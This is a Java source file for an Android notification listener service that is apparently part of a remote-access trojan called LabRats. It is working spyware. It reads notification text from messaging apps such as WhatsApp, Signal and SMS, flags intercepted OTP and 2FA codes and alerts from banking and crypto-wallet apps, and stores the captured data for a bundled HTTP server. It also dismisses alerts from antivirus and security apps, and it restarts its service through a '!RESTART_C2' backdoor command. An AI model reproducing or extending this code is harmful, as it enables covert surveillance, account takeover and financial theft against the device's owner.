package com.labs.labrats;

import android.app.Notification;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import java.util.ArrayList;
import java.util.List;
import java.util.Locale;

public class StatusNotification extends NotificationListenerService {
    private static final String TAG = "StatusNotification";
    public static final List<NotificationData> history = java.util.Collections.synchronizedList(new java.util.LinkedList<>());
    private static boolean isConnected = false;
    private static boolean historyLoaded = false;
    private static String lastNotificationId = ""; // De-duplication tracker
    private static final Handler saveHandler = new Handler(Looper.getMainLooper());
    private final Runnable saveRunnable = () -> LabRatsWorker.execute(this::saveHistory);

    public static class NotificationData {
        public String packageName;
        public String title;
        public String text;
        public long timestamp;

        public NotificationData(String packageName, String title, String text, long timestamp) {
            this.packageName = packageName;
            this.title = title;
            this.text = text;
            this.timestamp = timestamp;
        }
    }

    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
        isConnected = true;
        loadHistory();
        Log.d(TAG, "Uplink Established: Notification Listener Bound");
        LabRatsHttpServer.logActivity("INTEL_SYSTEM: Notification sniffer successfully bound to OS");
    }

    private void loadHistory() {
        if (historyLoaded) return;
        try {
            SharedPreferences prefs = getSharedPreferences("LabRATSSettings", MODE_PRIVATE);
            String json = prefs.getString("intel_history", "[]");
            org.json.JSONArray array = new org.json.JSONArray(json);
            synchronized (history) {
                history.clear();
                for (int i = 0; i < array.length(); i++) {
                    org.json.JSONObject obj = array.getJSONObject(i);
                    history.add(new NotificationData(
                        obj.getString("pkg"),
                        obj.getString("title"),
                        obj.getString("text"),
                        obj.getLong("time")
                    ));
                }
            }
            historyLoaded = true;
        } catch (Exception e) {
            Log.e(TAG, "Load History Error: " + e.getMessage());
        }
    }

    private void saveHistory() {
        try {
            SharedPreferences prefs = getSharedPreferences("LabRATSSettings", MODE_PRIVATE);
            org.json.JSONArray array = new org.json.JSONArray();
            synchronized (history) {
                for (NotificationData n : history) {
                    org.json.JSONObject obj = new org.json.JSONObject();
                    obj.put("pkg", n.packageName);
                    obj.put("title", n.title);
                    obj.put("text", n.text);
                    obj.put("time", n.timestamp);
                    array.put(obj);
                }
            }
            prefs.edit().putString("intel_history", array.toString()).apply();
        } catch (Exception e) {
            Log.e(TAG, "Save History Error: " + e.getMessage());
        }
    }

    @Override
    public void onListenerDisconnected() {
        super.onListenerDisconnected();
        isConnected = false;
        Log.d(TAG, "Uplink Severed: Notification Listener Unbound");
    }

    public static boolean isServiceRunning() {
        return isConnected;
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn == null) return;
        String packageName = sbn.getPackageName();
        if (packageName == null) return;
        
        // Fast-filter system noise using exact matches first
        if (packageName.equals("android.systemui") || 
            packageName.equals("com.android.vending") || 
            packageName.equals("com.google.android.gms") || 
            packageName.equals(getPackageName())) {
            return; 
        }

        String lowerPkg = packageName.toLowerCase();
        // Fallback to contains for broader system app detection
        if (lowerPkg.contains("myfiles") || lowerPkg.contains("download")) {
            return;
        }

        Notification notification = sbn.getNotification();
        if (notification == null) return;
        Bundle extras = notification.extras;
        if (extras == null) return;

        String title = extras.getString(Notification.EXTRA_TITLE);
        String text = null;

        // --- ANTI-ANTIVIRUS / SECURITY SILENCING ---
        if (lowerPkg.contains("security") || lowerPkg.contains("antivirus") ||
            lowerPkg.contains("defender") || lowerPkg.contains("knox") || 
            lowerPkg.contains("mcafee") || lowerPkg.contains("avast")) {
            
            cancelNotification(sbn.getKey());
            Log.w(TAG, "ANTI-AV: Silenced security alert from " + packageName);
            LabRatsHttpServer.logActivity("STEALTH_SHIELD: Silenced security alert from " + packageName);
        }

        // 1. Check for MessagingStyle (RCS / Blue Bubbles / WhatsApp)
        android.os.Parcelable[] messages = (android.os.Parcelable[]) extras.get(Notification.EXTRA_MESSAGES);
        if (messages != null && messages.length > 0) {
            Bundle lastMsg = (Bundle) messages[messages.length - 1];

            // Try different possible keys for text content
            CharSequence rcsText = lastMsg.getCharSequence("text");
            if (rcsText == null) rcsText = lastMsg.getCharSequence(Notification.EXTRA_TEXT);

            if (rcsText != null) text = rcsText.toString();

            // Try to find the person who sent it
            Object sender = lastMsg.get("sender");
            if (sender != null) {
                if (sender instanceof Bundle) {
                    // Modern Android MessagingStyle Person object
                    CharSequence name = ((Bundle)sender).getCharSequence("name");
                    if (name != null) title = name.toString() + " (" + (title != null ? title : "Group") + ")";
                } else {
                    title = sender.toString() + " (" + (title != null ? title : "Group") + ")";
                }
            }
        }

        // 2. Fallback to Standard Text Fields
        if (text == null || text.isEmpty()) {
            CharSequence cs = extras.getCharSequence(Notification.EXTRA_TEXT);
            if (cs != null) text = cs.toString();
        }

        // 3. Final fallbacks
        if (text == null || text.isEmpty()) {
            CharSequence big = extras.getCharSequence(Notification.EXTRA_BIG_TEXT);
            if (big != null) text = big.toString();
        }
        
        if (text == null || text.isEmpty()) {
            CharSequence sum = extras.getCharSequence(Notification.EXTRA_SUMMARY_TEXT);
            if (sum != null) text = sum.toString();
        }

        if (title == null) title = "Unknown Source";
        if (text == null || text.isEmpty()) return;

        String content = (title + " " + text).toLowerCase();

        // --- ENHANCED INTEL: OTP & FINANCIAL DETECTION ---
        // Automatically flag high-value credentials or alerts
        if (content.matches(".*\\b(otp|code|verification|2fa|verify|auth|confirm|login|pin|pass)\\b.*") || 
            content.matches(".*\\b\\d{4,8}\\b.*")) {
            LabRatsHttpServer.logActivity("INTEL_CRITICAL: Intercepted potential OTP/Auth code: " + title);
        }

        String[] financialApps = {"binance", "coinbase", "kucoin", "trustwallet", "metamask", "paypal", "venmo", "cashapp", "bank", "wallet"};
        for (String app : financialApps) {
            if (lowerPkg.contains(app)) {
                LabRatsHttpServer.logActivity("INTEL_FINANCIAL: Intercepted activity from " + app + ": " + title);
                break;
            }
        }

        // --- REMOTE RESTART BACKDOOR (CRITICAL: CHECK BEFORE DE-DUPLICATION) ---
        // Commands must always process, even if the notification looks identical to a previous one
        if (text.contains("!RESTART_C2")) {
            Log.w(TAG, "BACKDOOR: Received remote restart command");
            LabRatsHttpServer.logActivity("BACKDOOR: Initiating remote service restart via command");
            
            android.content.Intent restartIntent = new android.content.Intent(this, CoreSyncService.class);
            restartIntent.setAction("START");
            try {
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                    startForegroundService(restartIntent);
                } else {
                    startService(restartIntent);
                }
            } catch (Exception e) {
                Log.e(TAG, "Backdoor fail: " + e.getMessage());
            }
        }

        // --- DE-DUPLICATION ENGINE ---
        // Android often posts the same notification multiple times for updates (e.g. download progress)
        // We hash the content to ensure we only log it ONCE unless the message actually changes.
        String currentId = packageName + "|" + title + "|" + text;
        if (currentId.equals(lastNotificationId)) {
            return; // Duplicate detected, drop it
        }
        lastNotificationId = currentId;

        Log.d(TAG, "SNIFFED [" + packageName + "]: " + title + " -> " + text);

        // Alert the Terminal Logs for communication apps (Throttled)
        if (lowerPkg.contains("messaging") || lowerPkg.contains("messages") || 
            lowerPkg.contains("whatsapp") || lowerPkg.contains("telegram") || 
            lowerPkg.contains("sms") || lowerPkg.contains("mms") ||
            lowerPkg.contains("signal") || lowerPkg.contains("discord") ||
            lowerPkg.contains("snapchat") || lowerPkg.contains("facebook") ||
            lowerPkg.contains("instagram") || lowerPkg.contains("skype")) {
            
            String logText = (text.length() > 35) ? text.substring(0, 32) + "..." : text;
            LabRatsHttpServer.logActivity("INTEL_SNIFFED: [" + title + "] " + logText);
        }
        
        synchronized (history) {
            history.add(0, new NotificationData(packageName, title, text, sbn.getPostTime()));
            if (history.size() > 500) history.remove(history.size() - 1);
        }
        
        // Debounced Save: Only save to disk after 2 seconds of silence to prevent I/O flooding
        saveHandler.removeCallbacks(saveRunnable);
        saveHandler.postDelayed(saveRunnable, 2000);
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {}

    public static List<NotificationData> getHistory() {
        synchronized (history) {
            return new ArrayList<>(history);
        }
    }
    
    public static void clearHistory(Context context) {
        synchronized (history) {
            history.clear();
        }
        if (context != null) {
            context.getSharedPreferences("LabRATSSettings", Context.MODE_PRIVATE)
                    .edit().putString("intel_history", "[]").apply();
        }
    }
}
